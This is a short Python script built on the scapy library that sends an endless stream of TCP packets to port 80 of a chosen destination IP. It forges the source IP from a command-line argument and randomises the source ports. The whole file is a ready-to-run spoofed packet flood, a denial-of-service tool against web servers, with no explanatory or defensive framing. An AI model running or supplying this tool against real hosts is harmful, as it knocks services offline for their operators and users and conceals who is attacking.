#!/usr/bin/python
import sys
from scapy.all import IP,sr1,Ether,ICMP,send,sendp,RandShort,conf,TCP
if sys.argv[1] == "--help":
	  print("USAGE: python3 network.py <source_ip> <destiantion_ip>")
	  sys.exit()
if len(sys.argv)!= 3:
	print("USAGE: python3 network.py <source_ip> <destiantion_ip>")
else:
	conf.iface="wlan0"
	send(IP(src=str(sys.argv[1]),dst=str(sys.argv[2]),ttl=128)/TCP(sport=RandShort(),dport=80),loop=1)

          
	  
										

